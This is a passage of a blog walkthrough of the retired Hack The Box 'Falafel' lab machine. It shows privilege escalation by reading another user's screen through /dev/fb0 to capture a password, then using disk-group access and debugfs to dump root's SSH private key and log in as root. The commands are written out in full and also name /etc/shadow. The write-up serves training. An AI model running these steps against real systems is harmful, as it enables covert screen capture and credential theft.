+<h3 id="step-7d-get-the-user-flag">Step 7D: Get the User Flag</h3>
+<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+</code></pre>
+<p><strong>Flag:</strong> <code>1e90960[redacted]5bf217a</code></p>
+<p><strong>Hacker Mindset: Always check your groups immediately.</strong> <code>groups</code> tells you what resources you can access. Look at that list — <code>video</code>, <code>audio</code>, <code>floppy</code>, <code>games</code>, <code>adm</code>... these are not random. On a CTF box, unusual group memberships are <strong>always</strong> part of the intended path.</p>
+<hr />
+<h2 id="phase-8-privilege-escalation-to-yossi-the-framebuffer">Phase 8: Privilege Escalation to Yossi - The Framebuffer</h2>
+<h3 id="step-8a-check-who-else-is-logged-in">Step 8A: Check Who Else is Logged In</h3>
+<pre><code class="language-bash" data-language="bash">w
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yossi    tty1     -                Sat23   20:52m  0.04s  0.03s -bash
+</code></pre>
+<p><strong>Hacker Mindset: <code>yossi</code> is physically logged in on <code>tty1</code>.</strong> This means there's a real monitor and keyboard attached (or a virtual console). If we can see the screen, we might see what yossi is doing — maybe typing a password.</p>
+<h3 id="step-8b-check-video-group-access">Step 8B: Check Video Group Access</h3>
+<pre><code class="language-bash" data-language="bash">groups
+ls -l /dev/fb*
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>crw-rw---- 1 root video 29, 0 May 1 19:42 /dev/fb0
+</code></pre>
+<p><strong>What is <code>/dev/fb0</code>?</strong>
+The <strong>framebuffer</strong> is a memory-mapped device that represents the current contents of the screen. On Linux systems with a GUI or console, <code>/dev/fb0</code> contains the raw pixel data being displayed.</p>
+<p><strong>Why does <code>video</code> group matter?</strong>
+The framebuffer device is owned by <code>root</code> with group <code>video</code>. Since <code>moshe</code> is in the <code>video</code> group, we can read the screen.</p>
+<h3 id="step-8c-capture-the-screen">Step 8C: Capture the Screen</h3>
+<pre><code class="language-bash" data-language="bash">cat /dev/fb0 &gt; /tmp/screenshot.raw
+</code></pre>
+<h3 id="step-8d-get-screen-resolution">Step 8D: Get Screen Resolution</h3>
+<pre><code class="language-bash" data-language="bash">cat /sys/class/graphics/fb0/virtual_size
+</code></pre>
+<p><strong>Result:</strong> <code>1176,885</code></p>
+<p><strong>Why do we need this?</strong>
+The raw framebuffer is just a blob of bytes. To convert it to an image, we need to know:</p>
+<ul>
+<li>Width: 1176 pixels</li>
+<li>Height: 885 pixels</li>
+<li>Pixel format: we have to guess this (common formats: <code>rgb565</code>, <code>0rgb</code>, <code>bgr24</code>)</li>
+</ul>
+<h3 id="step-8e-transfer-to-kali-and-convert">Step 8E: Transfer to Kali and Convert</h3>
+<pre><code class="language-bash" data-language="bash"># On Kali
+scp moshe@10.129.229.139:/tmp/screenshot.raw ./screenshot.raw
+
+# Convert with ffmpeg
+ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -frames:v 1 screenshot.jpg
+xdg-open screenshot.jpg
+</code></pre>
+<p><strong>What we see in the image:</strong>
+Yossi is at a terminal. He typed his password by mistake into the username field of the <code>passwd</code> command:</p>
+<pre><code>yossi@falafel:~$ passwd
+Changing password for yossi.
+(current) UNIX password: null
+</code></pre>
+<p><strong>Password:</strong> REDACTED</p>
+<p><strong>Hacker Mindset: The framebuffer is an often-overlooked attack vector.</strong> If a user is physically logged in and you have <code>video</code> group access, you can literally <em>see their screen</em>. This is not theoretical — it's exactly what we just did. On shared systems, kiosks, or servers with physical consoles, this is a real threat.</p>
+<h3 id="step-8f-ssh-as-yossi">Step 8F: SSH as Yossi</h3>
+<pre><code class="language-bash" data-language="bash">ssh yossi@10.129.229.139
+</code></pre>
+<p>Password: null</p>
+<hr />
+<h2 id="phase-9-privilege-escalation-to-root-the-disk-group">Phase 9: Privilege Escalation to Root - The Disk Group</h2>
+<h3 id="step-9a-check-yossi-s-groups">Step 9A: Check Yossi's Groups</h3>
+<pre><code class="language-bash" data-language="bash">groups
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>yossi adm disk cdrom dip plugdev lpadmin sambashare
+</code></pre>
+<p><strong>Hacker Mindset: <code>disk</code> group is incredibly powerful.</strong> Members of the <code>disk</code> group can read and write directly to raw disk devices (<code>/dev/sda</code>, <code>/dev/sda1</code>, etc.). This means you can bypass the entire Linux permission system and read <em>any file on the disk</em>, including <code>/root/.ssh/id_rsa</code>, <code>/etc/shadow</code>, or anything else.</p>
+<p><strong>Why is this dangerous?</strong>
+The <code>disk</code> group is effectively root access because you can mount, read, and write the raw filesystem. The OS permission checks happen at the filesystem level, but if you're reading the raw device, you're bypassing those checks entirely.</p>
+<h3 id="step-9b-enumerate-disk-devices">Step 9B: Enumerate Disk Devices</h3>
+<pre><code class="language-bash" data-language="bash">df
+blkid
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+</code></pre>
+<h3 id="step-9c-use-debugfs-to-access-root-s-files">Step 9C: Use debugfs to Access Root's Files</h3>
+<p><code>debugfs</code> is a filesystem debugger that can operate on unmounted or mounted ext filesystems. Since we can read <code>/dev/sda1</code> (thanks to <code>disk</code> group), we can use <code>debugfs</code> to browse the filesystem as if we were root.</p>
+<pre><code class="language-bash" data-language="bash">debugfs /dev/sda1
+</code></pre>
+<p><strong>Inside debugfs:</strong></p>
+<pre><code>debugfs: ls -l /root/.ssh
+  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .
+   2456   40750 (2)      0      0    4096 30-May-2026 23:18 ..
+  56619  100600 (1)      0      0    1679 28-Nov-2017 23:01 id_rsa
+  56629  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
+  56631  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys
+
+debugfs: dump /root/.ssh/id_rsa /tmp/id_rsa
+debugfs: quit
+</code></pre>
+<p><strong>Hacker Mindset:</strong> We just extracted root's private SSH key by reading the raw disk device. The Linux kernel never checked whether <code>yossi</code> had permission to read <code>/root/.ssh/id_rsa</code> because we went <em>around</em> the kernel's permission system entirely.</p>
+<h3 id="step-9d-ssh-as-root">Step 9D: SSH as Root</h3>
+<pre><code class="language-bash" data-language="bash">chmod 600 /tmp/id_rsa
+ssh -i /tmp/id_rsa root@localhost
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
+root@falafel:~#
+</code></pre>
+<h3 id="step-9e-get-the-root-flag">Step 9E: Get the Root Flag</h3>
+<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+</code></pre>
+<p><strong>Flag:</strong> <code>cc38a0[redacted]3341cd5</code></p>
+<hr />
+<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
+<h3 id="1-the-developer-is-your-best-source-of-intelligence">1. The Developer is Your Best Source of Intelligence</h3>
+<p><code>cyberlaw.txt</code> literally handed us the entire exploitation path. Always read every file, every error message, every comment. Developers leave breadcrumbs everywhere.</p>
+<h3 id="2-understand-the-language-not-just-the-framework">2. Understand the Language, Not Just the Framework</h3>
+<p>PHP type juggling is a language-level quirk. If you only know "SQL injection" and "XSS", you miss vulnerabilities like this. Understanding how PHP compares strings and numbers is fundamental.</p>
+<h3 id="3-filter-bypass-understanding-the-underlying-mechanism">3. Filter Bypass = Understanding the Underlying Mechanism</h3>
+<p>The upload filter was not bypassed by a magic payload. It was bypassed by understanding that <strong>the filter and wget had different filename length limits</strong>. This is an intersection vulnerability — two systems interacting in an unexpected way.</p>
+<h3 id="4-groups-matter-more-than-you-think">4. Groups Matter More Than You Think</h3>
+<ul>
+<li><code>video</code> → read framebuffer → screenshot of active session</li>
+<li><code>disk</code> → read raw disk → bypass all filesystem permissions</li>
+<li><code>adm</code> → read logs</li>
+<li><code>audio</code> → record microphone (on some systems)</li>
+</ul>
+<p>On Linux, unusual group memberships are almost always part of the intended privilege escalation path.</p>
+<h3 id="5-the-framebuffer-is-a-real-attack-vector">5. The Framebuffer is a Real Attack Vector</h3>
+<p>Most penetration testers forget about <code>/dev/fb0</code>. But on systems with physical consoles or VMs with video devices, the framebuffer can reveal passwords, keystrokes, and sensitive data.</p>
+<h3 id="6-raw-disk-access-game-over">6. Raw Disk Access = Game Over</h3>
+<p>The <code>disk</code> group is effectively root. If you ever encounter it during a penetration test, treat it as a critical finding. With <code>debugfs</code>, <code>dd</code>, or even direct <code>strings</code> on <code>/dev/sda1</code>, you can extract any file on the system.</p>
+<h3 id="7-documentation-is-professionalism">7. Documentation is Professionalism</h3>
+<p>We saved nmap output (<code>-oA</code>). We noted exact paths, exact commands, and exact responses. Real-world penetration testing requires detailed reporting. The difference between a script kiddie and a professional is documentation.</p>
+<hr />
+<p><strong>Congratulations on rooting Falafel!</strong> </p>
+15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$19"}}]
+16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-facts-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Facts Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-fighter-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Fighter Walkthrough"}]]}]}]]}]
+17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1a:T51f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/#article","headline":"Hack The Box: Falafel Walkthrough","description":"An archived walkthrough of the retired Hack The Box Falafel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/","datePublished":"2026-06-11T15:16:55.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3196,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-falafel-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Falafel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1b:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: Falafel Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Falafel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: Falafel Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Falafel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-falafel-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-falafel-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box Falafel machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T15:16:55.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: Falafel Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Falafel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-falafel-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1b","30",{}]]
